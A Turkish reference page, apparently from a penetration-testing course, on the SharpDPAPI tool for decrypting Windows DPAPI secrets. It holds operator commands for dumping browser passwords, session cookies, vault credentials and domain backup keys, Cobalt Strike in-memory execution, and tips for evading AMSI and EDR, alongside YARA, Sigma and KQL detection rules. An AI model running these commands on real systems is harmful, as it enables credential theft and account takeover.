# SharpDPAPI

> **Kategori:** [7. Bellek Analizi, LSASS Dökümü ve Kasa Hasadı](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Will Schroeder (@harmj0y) tarafından GhostPack projesi kapsamında geliştirilen; Windows DPAPI (Data Protection API) mimarisini, kullanıcı ve makine MasterKey anahtarlarını, Windows Kasa (Vault) kayıtlarını, tarayıcı parolalarını/çerezlerini ve kurumsal yazılım sırlarını (RDCMan, KeePass, mRemoteNG) doğrudan bellek içinde (C# / .NET) çözümleyen post-exploitation aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory sızma testlerinde operatörler yerel yönetici veya SYSTEM ayrıcalıklarına ulaştığında parola hasadı için genellikle ilk olarak LSASS bellek alanına odaklanır. Ancak modern kurumsal sistemlerde **Windows Defender Credential Guard** veya **RunAsPPL** gibi korumalar aktif olduğunda LSASS bellek dökümü almak zorlaşır veya bellekten NTLM/Kerberos sırları elde edilemez.

Bu gibi senaryolarda **DPAPI (Data Protection API)**, işletim sistemindeki en zengin alternatif kimlik kaynağı haline gelir. Windows işletim sistemi;
- Kullanıcıların ve servis hesaplarının web tarayıcı şifrelerini (Chrome, Edge, Brave),
- Oturum açma çerezlerini (Session Cookies),
- Uzak Masaüstü Bağlantısı (RDP / Credential Manager) kayıtlarını,
- Windows Kasa (Vault) kimliklerini,
- RDCMan, mRemoteNG, KeePass ve Wi-Fi profillerini,
- IIS Uygulama Havuzu ve Zamanlanmış Görev şifrelerini

şifrelemek için DPAPI mimarisini kullanır.

**`SharpDPAPI`**, Mimikatz'ın `dpapi` modülünün C# (.NET) ile yeniden yazılmış ve operasyonel olarak çok daha ileri seviyeye taşınmış sürümüdür. Aracın temel çalışma mantığı şunlara dayanır:
1. **MasterKeyPool Havuzu:** Hedef sistemdeki `%APPDATA%\Microsoft\Protect\<SID>` veya `%SYSTEMROOT%\System32\Microsoft\Protect\S-1-5-18` dizinlerindeki tüm MasterKey dosyalarını tarar ve bir anahtar havuzuna (MasterKeyPool) ekler.
2. **Çoklu Çözümleme Vektörleri:**
   - **Mevcut Oturum Bağlamı:** Oturum açmış kullanıcının haklarıyla `CryptUnprotectData` Win32 API'sini doğrudan çağırarak,
   - **Etki Alanı Yedekleme Anahtarı (Domain Backup Key):** Etki alanı denetleyicisinden uzaktan RPC (`/server:`) üzerinden veya yerel `.pvk` dosyasıyla (`/pvk:`) MasterKey'leri deşifre ederek,
   - **Kullanıcı Hash'i:** Kullanıcının NTLM hash'i (`/ntlm:`) veya açık metin parolası (`/password:`) üzerinden PBKDF2 türetimi yaparak anahtarları açar.
3. **Otomatik Kasa Triage:** Açılan MasterKey'leri kullanarak sistemdeki tüm tarayıcıları, kasaları, RDP profillerini tek bir komutla (`triage` veya `machinetriage`) saniyeler içinde tarayıp konsola döker.

### Mimari Akış Şeması

```
┌────────────────────────────────────────────────────────────────────────┐
│             SALDIRGAN / C2 BEACON (execute-assembly)                   │
│                                                                        │
│  [ SharpDPAPI.exe (.NET / C#) ]                                        │
│         │                                                              │
│         ├── [ ADIM 1: MasterKey Toplama ve Havuz Oluşturma ]           │
│         │     └── C:\Users\*\AppData\Roaming\Microsoft\Protect\*       │
│         │                                                              │
│         ├── [ ADIM 2: MasterKey Deşifreleme (3 Yoldan Biri) ]          │
│         │     ├── Yol A: /pvk:domain_backup.pvk (LSA Domain Key)       │
│         │     ├── Yol B: /server:dc01 (RPC ile DC'den PVK Talep Et)    │
│         │     └── Yol C: /ntlm:01fc5a... (Kullanıcı NTLM Hash'i)       │
│         │                                                              │
│         ├── [ ADIM 3: MasterKeyPool Aktif Edilir ]                     │
│         │     └── GUID -> Raw 512-bit Key Eşleşmesi                    │
│         │                                                              │
│         └── [ ADIM 4: Triage & Hedef Veri Deşifreleme ]                │
│               ├── Chrome / Edge: Login Data + Cookies (AES-GCM)        │
│               ├── Windows Vault: Policy.vpol + .vcrd                   │
│               ├── Credentials: C:\Users\*\AppData\Local\Credentials    │
│               └── Machine DPAPI: SYSTEM Context Secrets (IIS, Tasks)   │
└────────────────────────────────────────────────────────────────────────┘
```

### 1.1 Kullanıcı ve Makine DPAPI Mimarisi Ayrımı

Windows'ta iki temel DPAPI çalışma düzeyi vardır:
- **Kullanıcı DPAPI (User DPAPI):** Kullanıcı oturumuyla ilişkilidir. MasterKey'ler `%APPDATA%\Microsoft\Protect\<UserSID>\<GUID>` altında saklanır. Kullanıcının parolası veya etki alanı kurtarma anahtarı (Domain Backup Key) ile korunur.
- **Makine DPAPI (System/Machine DPAPI):** `NT AUTHORITY\SYSTEM` bağlamında çalışan Windows servisleri, IIS havuzları ve görev zamanlayıcılar tarafından kullanılır. MasterKey'ler `C:\Windows\System32\Microsoft\Protect\S-1-5-18` altında saklanır. Şifreleme anahtarı yerel LSA Sırları (`DPAPI_SYSTEM`) içerisinde tutulur ve SYSTEM yetkilerine sahip bir saldırgan tarafından anında çözülebilir.

### Neden Önemli?

| Yetenek / Özellik | Açıklama | Operasyonel Değeri |
|---|---|---|
| **Disksiz C2 Entegrasyonu** | Saf C# .NET assembly formatındadır. | Cobalt Strike, Covenant ve Mythic üzerinde `execute-assembly` ile RAM'de çalışır. |
| **Credential Guard Engeli Yok**| LSASS bellek alanına dokunmaz; diskteki DPAPI blob'larını çözer. | Windows Defender Credential Guard devredeyken dahi tüm tarayıcı ve kasa şifrelerini çeker. |
| **Tam Kasa Triage Motoru** | Tek bir `triage` komutuyla sistemdeki onlarca farklı yazılımın şifrelerini tarar. | Hedefte manuel dosya arama ve kopyalama zahmetini tamamen ortadan kaldırır. |
| **RPC BackupKey Çekimi** | Domain Admin yetkisi varsa DC'ye uzaktan RPC çağrısı yaparak PVK anahtarını dinamik çeker. | Önceden DCSync veya secretsdump yapma zorunluluğunu ortadan kaldırır. |

### Karşılaştırma Tablosu

| Kriter | SharpDPAPI | DonPAPI | Mimikatz (dpapi) | Seatbelt |
|---|---|---|---|---|
| **Çalışma Yeri** | Hedef Sistem (In-Memory) | Saldırgan (Linux / SMB) | Hedef Sistem | Hedef Sistem |
| **Kod Tabanı** | Saf C# (.NET) | Python (Impacket) | Yerel C / Win32 | Saf C# (.NET) |
| **execute-assembly Uyumu**| **Mükemmel** | Uyumsuz (Linux aracı) | Uyumsuz (Zararlı PE) | Mükemmel |
| **Machine DPAPI Desteği**| VAR (`machinetriage`) | Kısıtlı | VAR | Kısıtlı (Metadata) |
| **EDR Yakalanma Riski** | Düşük - Orta | Sıfıra Yakın | Çok Yüksek | Çok Düşük (Sır çözmez) |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

```cmd
SharpDPAPI.exe <alt_komut> [seçenekler]
```

### Desteklenen Alt Komutlar (Subcommands)

| Alt Komut | Açıklama |
|---|---|
| `triage` | Tüm kullanıcıların Chrome/Edge/Firefox, Windows Vault ve Credential kayıtlarını tarar ve çözer. |
| `machinetriage` | SYSTEM yetkilerinde makine seviyesindeki DPAPI sırlarını (IIS, Tasks, Machine Certs) döker. |
| `masterkeys` | Hedefteki MasterKey dosyalarını listeler veya belirtilen anahtarla çözer. |
| `backupkeys` | Etki alanı denetleyicisinden DPAPI kurtarma anahtarlarını (PVK) uzaktan çeker. |
| `credentials` | Yalnızca Windows Credential Manager (`CREDENTIAL` blob'ları) kayıtlarını hedefler. |
| `vault` | Yalnızca Windows Vault (`.vcrd` ve `Policy.vpol`) kayıtlarını deşifre eder. |
| `chrome` | Yalnızca Google Chrome oturum çerezlerini ve kayıtlı web şifrelerini çeker. |
| `rdg` | Remote Desktop Connection Manager (RDCMan `.rdg`) dosyalarındaki şifreleri çözer. |
| `keepass` | KeePass yapılandırma dosyalarındaki DPAPI korumalı master key verilerini arar. |
| `certificates` | Kullanıcı veya makineye ait özel sertifika anahtarlarını (PFX / PVK) ayıklar. |

### Kritik Parametre Tablosu

| Parametre | Açıklama | Örnek Değer |
|---|---|---|
| `/pvk:<yol>` | Daha önce elde edilmiş Domain Backup Key dosyasının yolu. | `/pvk:C:\Temp\domain.pvk` |
| `/server:<dc>` | DPAPI kurtarma anahtarını uzaktan RPC ile çekecek Domain Controller adı. | `/server:dc01.corp.local` |
| `/password:<parola>` | MasterKey çözmek için açık metin kullanıcı parolası. | `/password:Winter2026!` |
| `/ntlm:<hash>` | MasterKey çözmek için kullanıcının NTLM hash'i. | `/ntlm:01fc5a6be7bc6929...` |
| `/target:<yol>` | Özel bir MasterKey veya şifreli dosya yolu belirtme. | `/target:C:\Users\jdoe\` |
| `/showall` | Yalnızca parolaları değil; boş veya deşifre edilemeyen kayıtları da listeler. | `/showall` |
| `/unprotect` | Oturum açmış kullanıcının yetkileriyle Win32 `CryptUnprotectData` API'sini kullanır. | `/unprotect` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Oturum Açmış Kullanıcının Tüm DPAPI Sırlarını Triage Etme

Mevcut kullanıcı oturumunda doğrudan `triage` komutu çalıştırılır. Araç kullanıcının MasterKey'lerini çözer ve tarayıcı/kasa şifrelerini basar.

```cmd
SharpDPAPI.exe triage
```

**Konsol Çıktısı Analizi:**

```text
[*] SharpDPAPI by @harmj0y
[*] Action: User Triage

[*] Scanning C:\Users\jdoe\AppData\Roaming\Microsoft\Protect\S-1-5-21-...
[+] Found MasterKey: {d7f8a9b0-1c2d-3e4f-5a6b-7c8d9e0f1a2b}
[*] MasterKey decrypted via current user context (CryptUnprotectData)!
[+] Added MasterKey to pool.

[*] --- Chrome Credentials ---
  URL: https://mail.corp.local/owa/
  Username: corp\jdoe
  Password: CompanyPassword2026!

[*] --- Windows Vault Credentials ---
  Target: git:https://github.com
  Username: personal_dev
  Password: ghp_9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c

[+] Triage completed successfully!
```

---

### Senaryo 2: SYSTEM Yetkileriyle Makine Genelinde DPAPI Triage (`machinetriage`)

SYSTEM ayrıcalıklarına sahip bir Beacon veya komut isteminde makine genelindeki servis şifreleri, IIS havuzları ve görev şifreleri dökülür:

```cmd
SharpDPAPI.exe machinetriage
```

---

### Senaryo 3: Uzak DC'den Backup Key Çekerek Tüm Kullanıcıları Deşifre Etme

Domain Admin haklarına sahip bir oturumda doğrudan etki alanı denetleyicisi hedeflenir; SharpDPAPI RPC üzerinden PVK anahtarını çeker ve yerel diskteki tüm profilleri çözer:

```cmd
SharpDPAPI.exe triage /server:dc01.corp.local
```

---

### Senaryo 4: Cobalt Strike `execute-assembly` ile Dosyasız Triage

Diske hiçbir dosya yazmadan Beacon belleği üzerinden tüm tarayıcı ve kasa şifreleri tek satırda çekilir:

```text
beacon> execute-assembly /opt/GhostPack/SharpDPAPI.exe triage
```

---

### Senaryo 5: Yalnızca Chrome ve Edge Oturum Çerezlerini Hedefleme

MFA korumalı web uygulamalarında oturum çalmak (Session Hijacking) amacıyla yalnızca çerez veritabanını deşifre etme:

```cmd
SharpDPAPI.exe chrome /showall
```

---

### Senaryo 6: NTLM Hash Belirterek Çevrimdışı Kullanıcı MasterKey'i Çözme

Daha önce ele geçirilmiş bir NTLM hash'i kullanılarak hedef kullanıcının MasterKey'i ve korunan sırları açılır:

```cmd
SharpDPAPI.exe triage /ntlm:01fc5a6be7bc6929c40372d23f5052b3
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `[-] MasterKey could not be decrypted` | Kullanıcı oturumu açık değil, `/pvk:` veya `/ntlm:` anahtarı sağlanmadı. | Etki alanı denetleyicisinden PVK anahtarını çekmek için `/server:<dc>` parametresini ekleyin veya kullanıcının NTLM hash'ini sağlayın. |
| `[-] Failed to retrieve domain backup key via RPC` | Mevcut kullanıcının etki alanında RPC üzerinden `LsaRetrievePrivateData` çağrısı yapma (Domain Admin) yetkisi yok. | Domain Admin haklarına sahip bir oturuma geçin veya önceden alınmış `.pvk` dosyasını `/pvk:` ile belirtin. |
| `Chrome App-Bound Encryption Error (v127+)` | Google Chrome v127+ sürümünde App-Bound şifreleme devrede; normal kullanıcı düzeyinde AES anahtarı çözülemiyor. | SYSTEM yetkilerine yükselerek `machinetriage` veya özel App-Bound deşifreleme araçlarını kullanın. |
| `Access is denied reading S-1-5-18 Protect folder` | Makine MasterKey'lerini okumak için SYSTEM yetkisi gerekir; komut standart Administrator oturumunda çalıştırıldı. | Oturumu `token::elevate` veya PsExec ile `NT AUTHORITY\SYSTEM` seviyesine yükseltin. |
| `Invalid NTLM hash format` | `/ntlm:` parametresine hash verilirken LM:NTLM formatında verildi veya 32 karakterlik hex dışında değer girildi. | Yalnızca 32 karakterlik ham NTLM hash'ini girin: `/ntlm:01fc5a6be7bc...`. |
| `CLR Exception: File locked by another process` | Tarayıcı o anda açık olduğu için SQLite `Login Data` veritabanı kilitli. | Tarayıcıyı kapatın veya dosyanın bir kopyasını `copy` ile geçici bir dizine alıp `/target:` ile gösterin. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
        GÜRÜLTÜ SEVİYESİ: DÜŞÜK - ORTA (BELLEK İÇİ .NET İCRASI)
──────────────────────────────────────────────────────────────────
[ Windows Logları ] : Event ID 4688 (Process Creation) [execute-assembly hariç]
[ Sysmon ]          : Event ID 1 (Assembly), Event ID 7 (.NET CLR Loading)
[ Dosya İzi ]       : AppData\Microsoft\Protect Dizininde Çoklu Dosya Okuma
[ Ağ İmzaları ]     : /server kullanıldığında DC'ye LSARPC Bağlantısı
```

### 5.1 Bırakılan İzler (Artifacts & Event Logs)

1. **Sysmon Event ID 7 (.NET Image Loaded):**
   - Standart bir Windows sürecine (örneğin `wmic.exe` veya `rundll32.exe`) `execute-assembly` ile enjekte edildiğinde `clr.dll`, `mscorlib.dll` yüklenmesi.
2. **Dosya Okuma İmzaları:**
   - `%APPDATA%\Microsoft\Protect\` altındaki MasterKey dosyalarının ve `%LOCALAPPDATA%\Google\Chrome\User Data\` altındaki `Login Data` dosyalarının taranması.
3. **RPC Ağ İmzası:**
   - `/server:` parametresi kullanıldığında, istemciden etki alanı denetleyicisinin `lsarpc` adlandırılmış borusuna (Named Pipe) `LsaRetrievePrivateData` çağrısı yapılması.

### 5.2 Ağ ve EDR İmzaları

- **Bellek İçi Tarama:** SharpDPAPI derlenmiş bir C# assembly'si olduğundan, kaynak kodundaki değişken adları (MasterKey, GhostPack vb.) karıştırılmadığında (Obfuscation yapılmadığında) AMSI veya EDR bellek taramalarına takılabilir.
- **LSARPC Anomalisi:** Sıradan bir iş istasyonunun DC'ye LSARPC üzerinden bağlanıp DPAPI yedek anahtarı sorması SIEM dedektörlerinde alarm üretir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araçtaki Karşılığı |
|---|---|---|
| **T1555.003** | Credentials from Web Browsers | Chrome ve Edge oturum çerezlerini ve parolalarını çözme. |
| **T1555.004** | Windows Credential Manager | Windows Vault ve RDP kimliklerini ayıklama. |
| **T1552.004** | Private Keys | Kullanıcı ve makine sertifikalarının özel anahtarlarını dökme. |
| **T1003** | OS Credential Dumping | DPAPI MasterKey'lerini hafızada veya diskte çözme. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Önlem ve Operasyonel Tavsiye |
|---|---|
| **AMSI / Bellek İmzası** | Hazır GitHub ikilisini asla çalıştırmayın. Kaynak kodundaki stringleri şifreleyin, ConfuserEx / InvisibilityCloak ile karıştırın. |
| **LSARPC Ağ Gürültüsü** | Canlı sistemde `/server:` parametresini doğrudan çağırmayın. PVK anahtarını önceden sessizce çekip `/pvk:` dosyası olarak sağlayın. |
| **Kilitli Dosya Hatası** | Tarayıcı veritabanlarını doğrudan okumak yerine bir kopyasını Temp dizinine alıp analiz edin. |

### 5.5 Savunma Karşılığı (Blue Team / KQL & Sigma & YARA)

**YARA Kuralı — SharpDPAPI Assembly İmzası:**

```yara
rule Suspicious_SharpDPAPI_Assembly {
    meta:
        description = "Detects SharpDPAPI .NET assembly used for DPAPI triage"
        author = "Active Directory Security Project"
        date = "2026-10-14"
        severity = "High"
    strings:
        $s1 = "SharpDPAPI" ascii wide nocase
        $s2 = "MasterKeyPool" ascii wide
        $s3 = "machinetriage" ascii wide
        $s4 = "CryptUnprotectData" ascii
    condition:
        uint16(0) == 0x5A4D and 3 of them
}
```

**Sigma Kuralı — Şüpheli SharpDPAPI Triage Komut Satırı Tespiti:**

```yaml
title: Suspicious SharpDPAPI Execution
status: experimental
description: Detects command line execution of SharpDPAPI or related DPAPI triage commands.
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 1
    CommandLine|contains|any:
      - 'triage'
      - 'machinetriage'
      - '/pvk:'
      - 'MasterKeyPool'
  condition: selection
level: high
```

**Microsoft Sentinel (KQL) — Şüpheli LSARPC DPAPI Yedek Anahtarı Erişimi:**

```kql
SecurityEvent
| where EventID == 4674
| where ObjectName has "lsarpc"
| where Privileges has "SeTcbPrivilege" or Privileges has "SeSecurityPrivilege"
| project TimeGenerated, Computer, SubjectUserName, ObjectName, Privileges
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Tam Kullanıcı DPAPI Triage
```cmd
SharpDPAPI.exe triage
```
- **Ne Yapar?** Mevcut kullanıcının MasterKey'lerini çözer, Chrome/Edge şifrelerini, çerezlerini ve Windows Vault kayıtlarını döker.
- **Ne Zaman Kullanılır?** Yönetici hakları olmayan veya olan bir kullanıcı oturumunda hızlı şifre avı için.
- **Parametreler:** `triage`: Genel tarama komutu.

### Komut 2: Makine Seviyesinde DPAPI Sırlarını Dökme
```cmd
SharpDPAPI.exe machinetriage
```
- **Ne Yapar?** SYSTEM bağlamında çalışan Windows servislerinin, IIS havuzlarının ve görev zamanlayıcıların parolalarını çözer.
- **Ne Zaman Kullanılır?** SYSTEM yetkilerine yükselindiğinde altyapı şifrelerini toplamak için.
- **Parametreler:** `machinetriage`: Makine düzeyi triage komutu.

### Komut 3: Cobalt Strike ile Bellek İçi Triage
```text
beacon> execute-assembly SharpDPAPI.exe triage
```
- **Ne Yapar?** SharpDPAPI ikilisini diske yazmadan doğrudan Beacon belleği üzerinden yürütür.
- **Ne Zaman Kullanılır?** C2 operasyonlarında dosyasız yürütme için.
- **Parametreler:** `execute-assembly`: .NET bellek yükleme komutu.

### Komut 4: Domain Backup Key Dosyası ile Tüm Profilleri Açma
```cmd
SharpDPAPI.exe triage /pvk:C:\Temp\domain.pvk
```
- **Ne Yapar?** Sağlanan PVK kurtarma anahtarını kullanarak diskteki tüm kullanıcıların MasterKey'lerini çözer.
- **Ne Zaman Kullanılır?** Hedef makinedeki diğer tüm kullanıcıların şifrelerini açmak için.
- **Parametreler:** `/pvk:`: Kurtarma anahtarı dosya yolu.

### Komut 5: Uzak DC'den Dinamik PVK Çekerek Triage
```cmd
SharpDPAPI.exe triage /server:dc01.corp.local
```
- **Ne Yapar?** Domain Admin oturumundayken DC'ye RPC ile bağlanıp PVK anahtarını otomatik alır ve sistemi çözer.
- **Ne Zaman Kullanılır?** Elinizde önceden alınmış bir `.pvk` dosyası olmadığında.
- **Parametreler:** `/server:`: Etki alanı denetleyicisi adı.

### Komut 6: Yalnızca Chrome Şifrelerini ve Çerezlerini Çekme
```cmd
SharpDPAPI.exe chrome /showall
```
- **Ne Yapar?** Diğer kasaları atlayarak yalnızca Google Chrome web şifrelerini ve oturum çerezlerini ekrana basar.
- **Ne Zaman Kullanılır?** Bulut oturumlarına sızmak için çerez hasadı yaparken.
- **Parametreler:** `chrome`: Tarayıcı modülü, `/showall`: Tüm kayıtları listele.

### Komut 7: NTLM Hash ile MasterKey Çözme
```cmd
SharpDPAPI.exe triage /ntlm:01fc5a6be7bc6929c40372d23f5052b3
```
- **Ne Yapar?** Belirtilen NTLM hash'inden anahtar türeterek kullanıcının MasterKey'lerini açar.
- **Ne Zaman Kullanılır?** Parola bilinmediğinde, yalnızca NTLM hash ele geçirildiğinde.
- **Parametreler:** `/ntlm:`: 32 karakterlik NTLM hash.

### Komut 8: Yalnızca Windows Credential Manager Kayıtlarını Çözme
```cmd
SharpDPAPI.exe credentials
```
- **Ne Yapar?** RDP kayıtlı parolalarını ve etki alanı SSO kimliklerini içeren `CREDENTIAL` blob'larını deşifre eder.
- **Ne Zaman Kullanılır?** Yanal hareket için RDP bağlantı şifrelerini ararken.
- **Parametreler:** `credentials`: Kasa modülü.

### Komut 9: RDCMan (.rdg) Dosyalarındaki Şifreleri Çözme
```cmd
SharpDPAPI.exe rdg /target:C:\Users\jdoe\Documents\servers.rdg
```
- **Ne Yapar?** Remote Desktop Connection Manager yapılandırma dosyasındaki şifreli sunucu kimliklerini açar.
- **Ne Zaman Kullanılır?** Sistem yöneticilerinin toplu RDP yönetim dosyalarını bulduğunuzda.
- **Parametreler:** `rdg`: RDCMan modülü, `/target:`: Dosya yolu.

### Komut 10: Makine Özel Sertifikalarını Dökme
```cmd
SharpDPAPI.exe certificates /machine
```
- **Ne Yapar?** Makine sertifika deposundaki (Local Machine Store) özel anahtarları dışa aktarır.
- **Ne Zaman Kullanılır?** AD CS veya makine kimlik doğrulaması yapan servis sertifikalarını çalmak için.
- **Parametreler:** `certificates`: Sertifika modülü, `/machine`: Makine deposu bayrağı.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [GhostPack / SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)
- **Harmj0y Blog:** [Operational DPAPI Usage and In-Memory Triage](https://blog.harmj0y.net/)
- **MITRE ATT&CK Referansı:** [T1555 - Credentials from Password Stores](https://attack.mitre.org/techniques/T1555/)
- **Microsoft DPAPI Mimarisi:** [Windows Data Protection API Internals](https://learn.microsoft.com/en-us/previous-versions/ms995355(v=msdn.10))

---

> **Önceki:** [← DonPAPI](./DonPAPI.md) · **Sonraki:** [dpapi →](./dpapi.md)
